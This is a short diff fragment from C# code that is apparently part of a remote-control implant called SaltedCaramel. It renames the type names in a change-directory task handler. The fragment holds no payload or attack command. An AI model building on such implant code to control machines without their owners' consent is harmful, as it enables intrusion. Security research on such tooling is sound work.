@@ -6,7 +6,7 @@ namespace SaltedCaramel.Tasks
 {
     class ChangeDir
     {
-        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
+        internal static void Execute(SCTask task, SCImplant implant)
         {
             string path = task.@params;
 
